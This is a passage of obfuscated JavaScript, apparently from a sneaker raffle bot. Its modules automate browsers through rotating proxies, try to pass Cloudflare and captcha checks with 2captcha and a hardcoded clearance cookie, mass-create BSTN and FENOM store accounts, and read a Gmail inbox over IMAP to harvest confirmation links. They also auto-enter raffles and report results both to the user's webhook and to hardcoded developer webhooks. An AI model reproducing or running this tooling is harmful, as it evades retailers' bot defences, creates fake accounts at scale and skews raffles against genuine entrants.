                            }), await _0x3c5dfd['goto']('' + _0x582c09), await _0x3c5dfd['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x3c5dfd['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x506d6f(0x7d0), console['log'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x506d6f(0x190), await _0x3c5dfd['waitForSelector']('#firstname'), await _0x3c5dfd['type']('#firstname', _0x224d56[_0xbb5f4a]['FirstName'], { 'delay': 0xf0 }), await _0x506d6f(0x190), await _0x3c5dfd['type']('#lastname', _0x224d56[_0xbb5f4a]['LastName'], { 'delay': 0xe6 }), await _0x506d6f(0x190), await _0x3c5dfd['type']('#email_address', _0x224d56[_0xbb5f4a]['Email'], { 'delay': 0x122 }), await _0x506d6f(0x190), await _0x3c5dfd['type']('#password', _0x224d56[_0xbb5f4a]['Password'], { 'delay': 0x82 }), await _0x506d6f(0x1f4), await _0x3c5dfd['type']('#password-confirmation', _0x224d56[_0xbb5f4a]['Password'], { 'delay': 0x7c }), console['log'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x506d6f(0x2bc), await _0x3c5dfd['$eval']('#form-validate', _0x329257 => _0x329257['submit']()), await _0x506d6f(0x1388);
                            const _0x5e8b48 = await _0x3c5dfd['$']('#email_address-error');
                            if (_0x5e8b48)
                                throw new Error('Invalid\x20Email');
                            const _0x22739b = await _0x3c5dfd['$']('#password-error');
                            if (_0x22739b)
                                throw new Error('Invalid\x20Password');
                            await _0x3c5dfd['waitForSelector']('div.mesg-success'), _0x208f33 = 'no', console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20Account\x20' + _0x224d56[_0xbb5f4a]['Email'] + '\x20Generated')), _0x5b0582['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x224d56[_0xbb5f4a]['Email'] + ',' + _0x224d56[_0xbb5f4a]['Password']);
                            try {
                                _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x4a80b8['succesDEVMSG']);
                            } catch {
                            }
                            await _0x57bb0c(_0x4f0ddd, _0x4a80b8['succesDEVMSG']), console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
                        } catch (_0x667938) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20' + _0x667938)), _0x96bd3b = '' + _0x667938;
                            var _0xe0c373 = await _0x52a86e(_0x224d56[_0xbb5f4a], _0x13b375, 'acc', !![], _0x96bd3b);
                            _0x4a80b8['errorDEV'] = { 'embeds': [_0xe0c373] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x4a80b8['errorDEV']), await _0x57bb0c(_0xb4796a, _0x4a80b8['errorDEV']), _0x208f33 = 'yes';
                        } finally {
                            _0x1ce296['close']();
                            if (_0x208f33 == 'yes' && _0x2e2839 != 0x5) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20Retrying')), _0xbb5f4a = _0xbb5f4a - 0x1, _0x2e2839 = _0x2e2839 + 0x1;
                                continue;
                            }
                            _0x208f33 == 'yes' && _0x2e2839 >= 0x5 && (_0x5c9ba1(_0x224d56[_0xbb5f4a], _0x13b375), _0x208f33 = 'no', _0x2e2839 = 0x0), console['log'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x266eb0, _0x3301e0, _0xbf85a7) {
                    var _0x3301e0 = [];
                    async function _0x30e398() {
                        var _0x553c94 = new _0x40f5d4({
                            'user': _0x5f2d88['masterMail'],
                            'password': _0x5f2d88['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2aa687(_0x1b1310) {
                            _0x553c94['openBox']('INBOX', ![], _0x1b1310);
                        }
                        _0x553c94['once']('ready', function () {
                            _0x2aa687(function (_0xdce118, _0x16dc4f) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xdce118)
                                    throw _0xdce118;
                                _0x553c94['seq']['search'](['UNSEEN'], function (_0x4c922b, _0x3b3c26) {
                                    if (!_0x3b3c26 || !_0x3b3c26['length'])
                                        console['log'](_0x15866d() + '\x20[' + _0x266eb0['name'] + ']\x20No\x20mails\x20found'), _0x553c94['end']();
                                    else {
                                        var _0x2ab918 = _0x553c94['seq']['fetch'](_0x3b3c26, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2ab918['on']('message', function (_0x4d4cd5, _0x215f4b) {
                                            var _0x4f7c97 = '(#' + _0x215f4b + ')\x20';
                                            _0x4d4cd5['on']('body', function (_0x307037, _0x17fc66) {
                                                _0xc3daf(_0x307037, (_0x3704c8, _0x3598d7) => {
                                                    if (_0x3598d7['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x1eebab = _0x3598d7['text']['split']('[')[0x2], _0x341a41 = _0x1eebab['split'](']')[0x0], _0x19725e = _0x3598d7['html']['split']('\x0a');
                                                        _0x3301e0['push'](_0x341a41);
                                                    }
                                                });
                                            }), _0x4d4cd5['once']('end', function () {
                                            });
                                        }), _0x2ab918['once']('error', function (_0x20545) {
                                            console['log']('Fetch\x20error:\x20' + _0x20545);
                                        }), _0x2ab918['once']('end', function () {
                                            _0x553c94['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x553c94['once']('error', function (_0x1ee851) {
                            console['log'](_0x195a86['red'](_0x1ee851['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x553c94['once']('end', async function () {
                        }), _0x553c94['connect']();
                    }
                    async function _0x2a12d6(_0x23046b, _0x2c9ca6, _0x3ff47d) {
                        _0x3cc012['use'](_0x28795e());
                        for (var _0x5ad465 = 0x0; _0x5ad465 < _0x2c9ca6['length']; _0x5ad465++) {
                            if (_0x472bd3 != 'yes')
                                var _0x472bd3 = '', _0x14b7c8 = 0x0;
                            var _0xaa841 = Math['round'](Math['random']() * (_0x3ff47d['length'] - 0x1)), _0x602345 = _0x3ff47d[_0xaa841]['split'](':');
                            const _0x189282 = await _0x3cc012['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x602345[0x0] + ':' + _0x602345[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x5d9954 = await _0x189282['newPage']();
                                await _0x5d9954['authenticate']({
                                    'username': '' + _0x602345[0x2],
                                    'password': '' + _0x602345[0x3]
                                }), console['log'](_0x15866d() + '\x20[' + _0x23046b['name'] + ']\x20Task\x20' + (_0x5ad465 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x5d9954['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5d9954['setRequestInterception'](!![]), _0x5d9954['on']('request', _0x23bcad => {
                                    _0x23bcad['resourceType']() === 'image' || _0x23bcad['resourceType']() === 'font' || _0x23bcad['resourceType']() === 'media' ? _0x23bcad['abort']() : _0x23bcad['continue']();
                                }), console['log'](_0x15866d() + '\x20[' + _0x23046b['name'] + ']\x20Task\x20' + (_0x5ad465 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d9954['goto'](_0x2c9ca6[_0x5ad465]), console['log'](_0x15866d() + '\x20[' + _0x23046b['name'] + ']\x20Task\x20' + (_0x5ad465 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5d9954['waitForTimeout'](0xbb8);
                                try {
                                    await _0x5d9954['waitForSelector']('.account-nav'), _0x472bd3 = 'no', console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x23046b['name'] + ']\x20Task\x20' + (_0x5ad465 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x365c0a = await _0x52a86e(null, _0x23046b, 'ver', ![]);
                                    const _0x38b81c = { 'succesDEVMSG': { 'embeds': [_0x365c0a] } };
                                    await _0x57bb0c(_0xe4ca4b, _0x38b81c['succesDEVMSG']);
                                } catch (_0x5b5322) {
                                    throw new Error(_0x5b5322);
                                }
                            } catch (_0x1ba751) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x23046b['name'] + ']\x20Task\x20' + (_0x5ad465 + 0x1) + '\x20:\x20' + _0x1ba751));
                                var _0x15ccf1 = _0x1ba751, _0xc0e3ea = await _0x52a86e(null, _0x23046b, 'ver', !![], _0x15ccf1);
                                const _0x2cb6b8 = { 'errorDEVMSG': { 'embeds': [_0xc0e3ea] } };
                                _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x2cb6b8['errorDEVMSG']), await _0x57bb0c(_0xb4796a, _0x2cb6b8['errorDEVMSG']), _0x472bd3 = 'yes';
                            } finally {
                                _0x189282['close']();
                                if (_0x472bd3 == 'yes' && _0x14b7c8 != 0x5) {
                                    console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x23046b['name'] + ']\x20Task\x20' + (_0x5ad465 + 0x1) + '\x20:\x20Retrying')), _0x5ad465 = _0x5ad465 - 0x1, _0x14b7c8 = _0x14b7c8 + 0x1;
                                    continue;
                                }
                                _0x472bd3 == 'yes' && _0x14b7c8 >= 0x5 && (_0x472bd3 = 'no', _0x14b7c8 = 0x0), console['log'](_0x15866d() + '\x20[' + _0x23046b['name'] + ']\x20Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                            }
                        }
                    }
                    try {
                        _0x30e398(), await _0x506d6f(0xfa0), console['log']('Found\x20' + _0x3301e0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2a12d6(_0x266eb0, _0x3301e0, _0xbf85a7);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1e533d, _0x53c055, _0x3dabc5) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3feab6 = 0x0; _0x3feab6 < _0x53c055['length']; _0x3feab6++) {
                        var _0x3b720f;
                        await _0x502cd4(_0x53c055, _0x3feab6);
                        if (_0x323923 != 'yes')
                            var _0x323923 = '', _0x3890ab = 0x0;
                        _0x3d4687(_0x1e533d['name'] + '\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20/\x20' + _0x53c055['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57);
                        var _0x1becc8 = Math['round'](Math['random']() * (_0x3dabc5['length'] - 0x1)), _0x4c23d4 = _0x3dabc5[_0x1becc8]['split'](':'), _0x4dc8eb;
                        try {
                            _0x4dc8eb = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4c23d4[0x0] + ':' + _0x4c23d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4dc8eb = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4c23d4[0x0] + ':' + _0x4c23d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x29cbd7 = await _0x4dc8eb['newPage'](), _0xc88961 = await _0x29cbd7['target']()['createCDPSession'](), { windowId: _0x2237c3 } = await _0xc88961['send']('Browser.getWindowForTarget');
                            await _0x29cbd7['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x5434b7 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x29cbd7['authenticate']({
                                'username': '' + _0x4c23d4[0x2],
                                'password': '' + _0x4c23d4[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29cbd7['goto']('' + _0x53c055[_0x3feab6]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x29cbd7['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0xc88961['send']('Browser.setWindowBounds', {
                                'windowId': _0x2237c3,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x506d6f(0x1388), await _0x29cbd7['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x29cbd7['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x506d6f(0x1f4), console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Logging\x20in'), await _0x29cbd7['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x17063f => _0x17063f['click']()), await _0x29cbd7['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x29cbd7['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x506d6f(0x7d0), await _0x29cbd7['waitForSelector']('#email-login'), await _0x29cbd7['type']('#email-login', '' + _0x53c055[_0x3feab6]['Email']), await _0x506d6f(0xdac), await _0x29cbd7['waitForSelector']('#password'), await _0x29cbd7['type']('#password', '' + _0x53c055[_0x3feab6]['Password'], { 'delay': 0xe6 }), await _0x506d6f(0x157c);
                            try {
                                await _0x29cbd7['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x595297 => _0x595297['click']());
                            } catch {
                            }
                            try {
                                await _0x29cbd7['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x361dca) {
                            }
                            await _0x506d6f(0x3e8);
                            const _0xdd6b52 = await _0x29cbd7['$']('.enteredDraw_container__2KmQ_');
                            if (_0xdd6b52)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x53c055[_0x3feab6]['Size']);
                            if (_0x53c055[_0x3feab6]['Size'] != 'RANDOM') {
                                var _0x5b229e = _0x53c055[_0x3feab6]['Size']['replace']('.', ',');
                                const _0x27c7bd = await _0x29cbd7['$x']('//div[contains(text(),\x20' + _0x5b229e + ')]');
                                await _0x27c7bd[0x0]['click']();
                            } else {
                                const _0x13069d = await _0x29cbd7['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x25c85d = Math['round'](Math['random']() * (_0x13069d['length'] - 0x1));
                                await _0x13069d[_0x25c85d]['click']();
                            }
                            await _0x506d6f(0x1f4);
                            const _0x2e12a5 = await _0x29cbd7['$']('.addressList_addressItem__LE2PB');
                            if (_0x2e12a5 && _0x53c055[_0x3feab6]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x29cbd7['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x506d6f(0x5dc), await _0x29cbd7['waitForSelector']('#firstname'), await _0x29cbd7['type']('#firstname', '' + _0x53c055[_0x3feab6]['FirstName']), await _0x506d6f(0x1f4), await _0x29cbd7['waitForSelector']('#firstname'), await _0x29cbd7['type']('#lastname', '' + _0x53c055[_0x3feab6]['LastName']), await _0x506d6f(0x1f4), await _0x29cbd7['waitForSelector']('#firstname'), await _0x29cbd7['type']('#street', '' + _0x53c055[_0x3feab6]['Address1']), await _0x506d6f(0x1f4), await _0x29cbd7['waitForSelector']('#firstname'), await _0x29cbd7['type']('#houseNumber', _0x53c055[_0x3feab6]['HouseNumber'] + '\x20' + _0x53c055[_0x3feab6]['Address2']), await _0x506d6f(0x1f4), await _0x29cbd7['waitForSelector']('#firstname'), await _0x29cbd7['select']('#country_code', '' + _0x53c055[_0x3feab6]['Country']), await _0x506d6f(0x1f4), await _0x29cbd7['type']('#postcode', '' + _0x53c055[_0x3feab6]['Zip']), await _0x506d6f(0x1f4), await _0x29cbd7['type']('#city', '' + _0x53c055[_0x3feab6]['City']), await _0x506d6f(0x1f4), await _0x29cbd7['type']('#telephone', '' + _0x53c055[_0x3feab6]['Phone']), await _0x506d6f(0x1f4), await _0x29cbd7['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x506d6f(0x9c4);
                            try {
                                await _0x29cbd7['type']('#instagram_name', '' + _0x53c055[_0x3feab6]['Follower']), await _0x29cbd7['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x506d6f(0x5dc);
                            try {
                                await _0x29cbd7['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x506d6f(0x5dc), await _0x29cbd7['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x218b3c => _0x218b3c['click']()), await _0x506d6f(0x1388);
                            try {
                                await _0x29cbd7['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x29cbd7['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x53c055[_0x3feab6]['Size'] != 'RANDOM') {
                                    var _0x5b229e = _0x53c055[_0x3feab6]['Size']['replace']('.', ',');
                                    const _0x41fbc3 = await _0x29cbd7['$x']('//div[contains(text(),\x20' + _0x5b229e + ')]');
                                    await _0x41fbc3[0x0]['click']();
                                } else {
                                    const _0x2b43e6 = await _0x29cbd7['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x25c85d = Math['round'](Math['random']() * (_0x2b43e6['length'] - 0x1));
                                    await _0x2b43e6[_0x25c85d]['click']();
                                }
                                await _0x506d6f(0x5dc);
                                try {
                                    await _0x29cbd7['hover']('#instagram_name'), await _0x29cbd7['type']('#instagram_name', '' + _0x53c055[_0x3feab6]['Follower']), await _0x29cbd7['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Retrying'), await _0x29cbd7['hover']('.checkBox_boxHolder__wLGVe'), await _0x506d6f(0x5dc), await _0x29cbd7['click']('.checkBox_boxHolder__wLGVe'), await _0x506d6f(0x157c), await _0x29cbd7['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xaa5b40 => _0xaa5b40['click']()), await _0x506d6f(0x1388), await _0x29cbd7['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x323923 = 'no', _0x37d376(_0x53c055[_0x3feab6], _0x1e533d), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x480cf4 = await _0x52a86e(_0x53c055[_0x3feab6], _0x1e533d, 'dev', ![]), _0x4d0456 = await _0x52a86e(_0x53c055[_0x3feab6], _0x1e533d, 'pub', ![]);
                            const _0x487cf0 = {
                                'succesDEVMSG': { 'embeds': [_0x480cf4] },
                                'succesPUBMSG': { 'embeds': [_0x4d0456] }
                            };
                            try {
                                _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x487cf0['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x487cf0['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x3f4ede, _0x487cf0['succesPUBMSG']);
                            } catch (_0x10ad36) {
                                console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x10ad36));
                            }
                        } catch (_0x41cb01) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20' + _0x41cb01)), _0x323923 = 'yes', _0x3b720f = '' + _0x41cb01;
                            var _0x251bf6 = await _0x52a86e(_0x53c055[_0x3feab6], _0x1e533d, 'dev', !![], _0x3b720f), _0x480cf4 = await _0x52a86e(_0x53c055[_0x3feab6], _0x1e533d, 'dev', ![]), _0x4d0456 = await _0x52a86e(_0x53c055[_0x3feab6], _0x1e533d, 'pub', ![]);
                            const _0x5c20a7 = {
                                'succesDEVMSG': { 'embeds': [_0x480cf4] },
                                'succesPUBMSG': { 'embeds': [_0x4d0456] }
                            };
                            _0x5c20a7['errorDEV'] = { 'embeds': [_0x251bf6] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x5c20a7['errorDEV']), await _0x57bb0c(_0xb4796a, _0x5c20a7['errorDEV']);
                        } finally {
                            _0x4dc8eb['close']();
                            if (_0x323923 == 'yes' && _0x3890ab != 0x5) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Task\x20' + (_0x3feab6 + 0x1) + '\x20:\x20Retrying')), _0x3feab6 = _0x3feab6 - 0x1, _0x3890ab = _0x3890ab + 0x1;
                                continue;
                            }
                            _0x323923 == 'yes' && _0x3890ab >= 0x5 && (_0x5c9ba1(_0x53c055[_0x3feab6], _0x1e533d), _0x323923 = 'no', _0x3890ab = 0x0), console['log'](_0x15866d() + '\x20[' + _0x1e533d['name'] + ']\x20Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0xf49c5d, _0x424154, _0x3f9639) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x699074 = 0x0; _0x699074 < _0x424154['length']; _0x699074++) {
                        if (_0x3e1a36 != 'yes')
                            var _0x3e1a36 = '', _0x49997f = 0x0;
                        var _0x40c097;
                        await _0x502cd4(_0x424154, _0x699074), _0x3d4687(_0xf49c5d['name'] + '\x20Task\x20' + (_0x699074 + 0x1) + '\x20/\x20' + _0x424154['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57);
                        var _0x362e0f = await _0x52a86e(_0x424154[_0x699074], _0xf49c5d, 'acc', ![]);
                        const _0x4e68d5 = { 'succesDEVMSG': { 'embeds': [_0x362e0f] } }, _0x3c8609 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x33cadb = Math['round'](Math['random']() * (_0x3f9639['length'] - 0x1)), _0xd2b07c = _0x3f9639[_0x33cadb]['split'](':'), _0x22b014;
                        try {
                            _0x22b014 = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xd2b07c[0x0] + ':' + _0xd2b07c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x22b014 = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xd2b07c[0x0] + ':' + _0xd2b07c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xbea419 = await _0x22b014['newPage']();
                            await _0xbea419['setViewport']({
                                'width': 0x500 + _0x31107f(0x1, 0x32),
                                'height': 0x2d9 + _0x31107f(0x1, 0x32)
                            });
                            const _0x5d8064 = await _0xbea419['target']()['createCDPSession'](), { windowId: _0x5ed06c } = await _0x5d8064['send']('Browser.getWindowForTarget');
                            await _0xbea419['authenticate']({
                                'username': '' + _0xd2b07c[0x2],
                                'password': '' + _0xd2b07c[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Task\x20' + (_0x699074 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xbea419['goto']('' + _0x3c8609, { 'waitUntil': 'networkidle2' }), await _0x506d6f(0x1388), console['log'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Task\x20' + (_0x699074 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x3fe528 = await _0xbea419['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x3fe528 && await _0x3fe528['click']();
                            } catch {
                            }
                            await _0x5d8064['send']('Browser.setWindowBounds', {
                                'windowId': _0x5ed06c,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0xbea419['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x506d6f(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Task\x20' + (_0x699074 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xbea419['type']('input[name=\x22firstname\x22]', '' + _0x424154[_0x699074]['FirstName']), await _0x506d6f(0x1f4), await _0xbea419['type']('input[name=\x22lastname\x22]', '' + _0x424154[_0x699074]['LastName']), await _0x506d6f(0x1f4), await _0xbea419['type']('input[name=\x22email\x22]', '' + _0x424154[_0x699074]['Email']), await _0x506d6f(0x1f4), await _0xbea419['type']('input[name=\x22password\x22]', '' + _0x424154[_0x699074]['Password']), await _0x506d6f(0x258), await _0xbea419['$eval']('input[name=\x22psgdpr\x22]', _0x2a396e => _0x2a396e['click']()), await _0x506d6f(0x1f4), console['log'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Task\x20' + (_0x699074 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xbea419['$eval']('#customer-form', _0xcc7eb5 => _0xcc7eb5['submit']());
                            try {
                                await _0xbea419['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x3e1a36 = 'no', console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Task\x20' + (_0x699074 + 0x1) + '\x20:\x20Account\x20' + _0x424154[_0x699074]['Email'] + '\x20Generated')), _0x5b0582['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x424154[_0x699074]['Email'] + ',' + _0x424154[_0x699074]['Password']);
                                try {
                                    _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x4e68d5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x57bb0c(_0x4f0ddd, _0x4e68d5['succesDEVMSG']);
